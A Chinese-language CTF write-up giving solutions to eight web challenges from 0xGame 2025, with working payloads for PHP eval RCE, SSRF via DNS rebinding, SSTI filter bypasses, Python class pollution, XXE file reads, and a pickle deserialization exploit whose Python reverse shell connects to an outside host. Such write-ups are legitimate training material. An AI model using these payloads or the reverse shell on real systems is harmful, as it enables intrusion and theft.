---
title: 0xgameCTF2025 Web部分题解
categories: CTF
---

## 一. RCE1

源码如下：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$rce1 = $_GET['rce1'];
$rce2 = $_POST['rce2'];
$real_code = $_POST['rce3'];

$pattern = '/(?:\d|[\$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i';

function check(string $text): bool {
    global $pattern;
    return (bool) preg_match($pattern, $text);
}

if (isset($rce1) && isset($rce2)){
    if(md5($rce1) === md5($rce2) && $rce1 !== $rce2){
        if(!check($real_code)){
            eval($real_code);
        } else {
            echo "Don't hack me ~";
        }
    } else {
        echo "md5 do not match correctly";
    }
}
else{
    echo "Please provide both rce1 and rce2";
}
?>
```

**第一层 WAF**：md5 数组绕过，`rce1[]=1`、`rce2[]=2`

**第二层 WAF**：过滤了关键字，使用反引号执行绕过：

```powershell
print `tac /f???`;
```

**EXP**：

```
GET:  http://.../?rce1[]=1
POST: rce2[]=2&rce3=print `tac /f???`;
```

---

## 二. DNS想要玩

源码如下：

```python
from flask import Flask, request
from urllib.parse import urlparse
import socket
import os

app = Flask(__name__)

BlackList=[
    'localhost', '@', '172', 'gopher', 'file', 'dict', 'tcp', '0.0.0.0', '114.5.1.4'
]

def check(url):
    url = urlparse(url)
    host = url.hostname
    host_acscii = host.encode('idna').decode('utf-8')
    return socket.gethostbyname(host_acscii) == '114.5.1.4'

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/ssrf')
def ssrf():
    raw_url = request.args.get('url')
    if not raw_url:
        return 'URL Needed'
    for u in BlackList:
        if u in raw_url:
            return 'Invaild URL'
    if check(raw_url):
        return os.popen(request.args.get('cmd')).read()
    else:
        return "NONONO"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8000)
```

**考点**：SSRF + DNS 重绑定攻击。题目要求解析后的 IP 必须等于 `114.5.1.4`，但同时又不能直接出现黑名单中的 IP。使用 DNS 重绑定服务：

1. 打开 https://lock.cmpxchg8b.com/rebinder.html
2. A 输入 `127.0.0.1`，B 输入 `114.5.1.4`
3. 生成域名：`7f000001.72050104.rbndr.us`

**EXP**：

```
http://.../ssrf?url=http://7f000001.72050104.rbndr.us&cmd=cat /flag
```

**第二种解法**：将 IP 转换为十进制格式，`114.5.1.4` → `1912930564`

{% asset_img image.png %}

---

## 三. 404 Not fond

SSTI 模板注入。页面路径输入 `{{1+1}}` 确认存在模板注入：

{% asset_img image_1.png %}
{% asset_img image_2.png %}

经 FUZZ 发现过滤了 `.`、`__`、`globals` 等关键字。

**Bypass payload**：

```
{lipsum['__''glo''bals__']['o''s']['pop''en']("cat /f*")'re''ad'}
```

**Flag**: `0xGame{404_Not_Found_rEvenGe_Still_SSTI!}`

---

## 四. 绳网委托Bottle版

Bottle 框架 SSTI。输入 `{{7*7}}` 确认注入点，发现大括号被过滤：

{% asset_img image_3.png %}

使用多行字符串 bypass：

```python
"""
% import os
% flag_data = os.popen("cat /f*").read()
% __import__('bottle').abort(200, flag_data)
"""
```

{% asset_img image_4.png %}

---

## 五. Lemon_RevEnge

源码如下：

```python
from flask import Flask,request,render_template
import json
import os

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Dst():
    def __init__(self):
        pass

Game0x = Dst()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), Game0x)
    return render_template("index.html", Game0x=Game0x)

@app.route("/<path:path>")
def render_page(path):
    if not os.path.exists("templates/" + path):
        return "Not Found", 404
    return render_template(path)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)
```

深度递归合并对象 → Python 原型链污染。

**Payload**：将静态文件根目录挂载到 `/`，读取任意文件。

```
POST / HTTP/1.1
Host: ...
Content-Type: application/json

{
    "__init__": {
        "__globals__": {
            "app": {
                "_static_folder": "/"
            }
        }
    }
}
```

```
GET /static/flag HTTP/1.1
Host: ...
```

**Flag**: `0xGame{Welcome_to_Easy_Pollute~}`

---

## 六. 放开我的变量

目录扫描发现 `robots.txt`：

```
Disallow:/asdback.php
```

访问发现后门：

```php
<?php
highlight_file(__FILE__);
echo("Please Input Your CMD");
$cmd = $_POST['__0xGame2025phpPsAux'];
eval($cmd);
?>
```

用蚁剑连接，查看进程发现 `/start.sh`：

```bash
#!/bin/bash
cd /var/www/html/primary
while :
do
    cp -P * /var/www/html/marstream/
    chmod 755 -R /var/www/html/marstream/
    sleep 5s
done &
exec apache2-foreground
```

`cp -P` 只复制链接文件本身而非指向的内容。利用方式：在 primary 目录下创建 `-H` 参数文件和 flag 的软链接，使 cp 将软链接指向的内容复制出来。

```bash
echo "" > -H
ln -s /flag f
cat /var/www/html/marstream/f
```

**Flag**: `0xGame{6dbdb141-9c93-44e8-aa8c-3b6dda89612d}`

---

## 七. 留言板(粉)

### 预期解

登录 `login.php`，弱口令 `admin:admin123` 登入：

{% asset_img image_7.png %}
{% asset_img image_8.png %}

XXE 标签提示，payload：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE ANY[
    <!ENTITY Quan SYSTEM "file:///flag">
]>
<login>
  <username>&Quan;</username>
  <password>test</password>
</login>
```

**Flag**: `0xGame{1a903b96-173a-8b3d-8a37-a81934dc4187_xxe114514}`

### 非预期解

目录扫描发现 `/Dockerfile`：

```dockerfile
FROM php:8.1-cli
WORKDIR /var/www/html
COPY . .
RUN echo "0xGame{1a903b96-173a-8b3d-8a37-a81934dc4187_xxe114514}" > /flag
EXPOSE 8000
CMD ["php", "-S", "0.0.0.0:8000"]
```

---

## 八. 马哈鱼商店

注册登录后购买 Pickle 商品，抓包改折扣 `discount=0.00000000001` 买到源码：

```python
BlackList = [b'', b'\x1e']

@app.route('/pickle_dsa')
def pic():
    data = request.args.get('data')
    if not data:
      return "Use GET To Send Your Loved Data"
    try:
        data = base64.b64decode(data)
    except Exception:
        return "Cao!!!"

    for b in BlackList:
        if b in data:
            return "卡了"
    p = pickle.loads(data)
    print(p)
    return f"Vamos! {p}"
```

过滤了字节 `0x1e`。protocol=2/3 是二进制协议会包含控制字符，使用 protocol=0（文本协议）绕过。

```python
import pickle
import base64

cmd = '''export RHOST="5508.axzt.top";export RPORT=40025;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' '''

class Exp:
    def __reduce__(self):
        return (__import__("os").system, (cmd,))

data = pickle.dumps(Exp(), protocol=0)
assert b"\x00" not in data
assert b"\x1e" not in data
print(base64.b64encode(data).decode())
```

VPS 监听反弹 shell，查看环境变量获取 flag。

**Flag**: `0xGame{You_Have_Learned_How_to_Buy_Pickle!!}`
